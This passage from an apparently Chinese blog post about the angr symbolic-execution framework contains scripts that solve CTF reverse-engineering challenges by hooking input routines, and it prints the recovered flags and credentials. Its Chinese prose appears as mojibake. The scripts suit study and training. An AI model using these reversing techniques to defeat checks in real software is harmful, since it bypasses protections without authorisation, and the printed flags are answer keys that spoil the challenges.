    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> self<span class="token punctuation">.</span>call_addr   
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">)</span>
        <span class="token comment"># self.inline_call()</span>


<span class="token keyword">class</span> <span class="token class-name">MyGetStringUTFChars</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>size<span class="token punctuation">,</span>return_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> size
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># print("[HOOKED-INFO]EIP:",st.regs.eip,"CALLING GetStringUTFChars(",arg0,arg1,arg2,")")</span>
        flag_addr   <span class="token operator">=</span> <span class="token number">0x5000000</span>
        flag_length <span class="token operator">=</span> self<span class="token punctuation">.</span>size
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> flag_addr
        flag_char <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%i"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag_length<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># assume len(flag) &lt;= 64</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_char<span class="token punctuation">:</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_char<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">hook_length</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>flag_size<span class="token punctuation">,</span>return_addr<span class="token punctuation">,</span>unhook_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>flag_size <span class="token operator">=</span> flag_size
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
        self<span class="token punctuation">.</span>unhook_addr <span class="token operator">=</span> unhook_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> self<span class="token punctuation">.</span>flag_size
        self<span class="token punctuation">.</span>project<span class="token punctuation">.</span>unhook<span class="token punctuation">(</span>self<span class="token punctuation">.</span>unhook_addr<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Basic_Stirng</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x83A0</span>   
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"Basic_String"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>flag_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'angr.manager'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
    p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./libnative-lib.so'</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8DCE</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x82B6</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x82C2</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8EB8</span><span class="token punctuation">,</span>MyGetStringUTFChars<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span>return_addr<span class="token operator">=</span><span class="token number">0x8EBA</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8EBF</span><span class="token punctuation">,</span>hook_length<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span><span class="token number">0x8EC4</span><span class="token punctuation">,</span><span class="token number">0x8EBF</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    
    checkName_off <span class="token operator">=</span> <span class="token number">0x8DA0</span>
    
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> base <span class="token operator">+</span> checkName_off<span class="token punctuation">)</span>
    <span class="token comment"># åˆå§‹åŒ–æ ˆ</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> <span class="token number">0x8000000</span>  <span class="token comment"># 0xC TO BE Aligned</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> <span class="token number">0x7000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> <span class="token number">0x0</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    memcpy_off <span class="token operator">=</span> <span class="token number">0x8F0F</span>
    
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span>memcpy_off<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>stashes<span class="token punctuation">)</span>
    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        fd <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sp <span class="token operator">=</span> fd<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># IPython.embed()</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg0<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\ns2 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\nn = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag_number <span class="token operator">=</span> fd<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg0<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_number<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FLAG : "</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
        IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'12jammyT\x00'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span>flag_size<span class="token operator">=</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æœ€åæŠŠè¿™ä¸ªè´¦å·å¯†ç è¾“å…¥è¿› app ä¸­å°±å¯ä»¥å¾—åˆ° flag<br>12jammyT<br>stove:spill2:drivable:1<br>rarctf{pl34s3_d0nt_s0lv3_st4tic4lly_3829103890}</p>
<p><strong>æ€ä¹ˆåŠ¨è°ƒè¿˜æ˜¯ä¸çŸ¥é“ã€‚ã€‚ã€‚è¿™å’‹åŠ</strong></p>
<h3 id="inctf2021-chall-DONE"><a href="#inctf2021-chall-DONE" class="headerlink" title="inctf2021 chall |DONE"></a>inctf2021 chall |DONE</h3><p>ç®€å•çš„ä¸€ä¸ªæ‰§è¡Œï¼Œæ²¡æœ‰ä»€ä¹ˆéœ€è¦ç‰¹åˆ«æ³¨æ„çš„ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> archinfo

base <span class="token operator">=</span> <span class="token number">0x0</span>

<span class="token keyword">def</span> <span class="token function">hook_input</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag_addr <span class="token operator">=</span> <span class="token number">0x202100</span><span class="token operator">+</span>base
    flag_length <span class="token operator">=</span> <span class="token number">30</span>
    flag_char <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%i"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag_length<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_char<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>

    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_char<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0xB84</span><span class="token operator">+</span>base<span class="token punctuation">,</span>hook_input<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    find_answer   <span class="token operator">=</span> <span class="token number">0xADB</span>
    find <span class="token operator">=</span> <span class="token punctuation">[</span>find_answer<span class="token punctuation">]</span>
    
    avoid <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xB9B</span><span class="token operator">+</span>base<span class="token punctuation">]</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> find<span class="token punctuation">,</span>avoid <span class="token operator">=</span> avoid<span class="token punctuation">)</span>

    fd      <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        fd <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flag_list <span class="token operator">=</span> fd<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x202100</span><span class="token operator">+</span>base<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Advanced-Topics"><a href="#Advanced-Topics" class="headerlink" title="Advanced Topics"></a>Advanced Topics</h2><p>from source &amp;&amp; angr-doc</p>
<h3 id="emulated-filesystem"><a href="#emulated-filesystem" class="headerlink" title="emulated filesystem"></a>emulated filesystem</h3><p>example é‡Œé¢çš„ asis ç”¨åˆ°è¿‡ï¼Œè¿˜è¡Œ</p>
<h3 id="The-Whole-Pipeline"><a href="#The-Whole-Pipeline" class="headerlink" title="The Whole Pipeline"></a>The Whole Pipeline</h3><p>è¿™ä¸ªæˆ‘è§‰å¾—æŒºé‡è¦çš„ï¼Œæ²¡çœ‹æ‡‚æºç çš„æƒ…å†µä¸‹ï¼Œangr æ‰§è¡Œçš„å°±åƒä¸ªé»‘ç›’ï¼Œä¸å¯é¢„æµ‹ã€‚</p>
<h4 id="sm-explore-1"><a href="#sm-explore-1" class="headerlink" title="sm.explore()"></a>sm.explore()</h4><p>sm.run() çš„ä¸€ä¸ªåŒ…è£…</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">explore</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stash<span class="token operator">=</span><span class="token string">'active'</span><span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> find<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> avoid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> find_stash<span class="token operator">=</span><span class="token string">'found'</span><span class="token punctuation">,</span> avoid_stash<span class="token operator">=</span><span class="token string">'avoid'</span><span class="token punctuation">,</span> cfg<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
            num_find<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Tick stash "stash" forward (up to "n" times or until "num_find" states are found), looking for condition "find",
    avoiding condition "avoid". Stores found states into "find_stash' and avoided states into "avoid_stash".

    The "find" and "avoid" parameters may be any of:

    - An address to find
    - A set or list of addresses to find
    - A function that takes a state and returns whether or not it matches.

    If an angr CFG is passed in as the "cfg" parameter and "find" is either a number or a list or a set, then
    any states which cannot possibly reach a success state without going through a failure state will be
    preemptively avoided.
    """</span>
    num_find <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_stashes<span class="token punctuation">[</span>find_stash<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> find_stash <span class="token keyword">in</span> self<span class="token punctuation">.</span>_stashes <span class="token keyword">else</span> <span class="token number">0</span>
    tech <span class="token operator">=</span> self<span class="token punctuation">.</span>use_technique<span class="token punctuation">(</span>Explorer<span class="token punctuation">(</span>find<span class="token punctuation">,</span> avoid<span class="token punctuation">,</span> find_stash<span class="token punctuation">,</span> avoid_stash<span class="token punctuation">,</span> cfg<span class="token punctuation">,</span> num_find<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Modify first Veritesting so that they can work together.</span>
    deviation_filter_saved <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> self<span class="token punctuation">.</span>_techniques<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>Veritesting<span class="token punctuation">)</span><span class="token punctuation">:</span>
            deviation_filter_saved <span class="token operator">=</span> t<span class="token punctuation">.</span>options<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"deviation_filter"</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> deviation_filter_saved <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> tech<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">or</span> tech<span class="token punctuation">.</span>avoid<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">or</span> deviation_filter_saved<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> tech<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">or</span> tech<span class="token punctuation">.</span>avoid<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>run<span class="token punctuation">(</span>stash<span class="token operator">=</span>stash<span class="token punctuation">,</span> n<span class="token operator">=</span>n<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>remove_technique<span class="token punctuation">(</span>tech<span class="token punctuation">)</span>
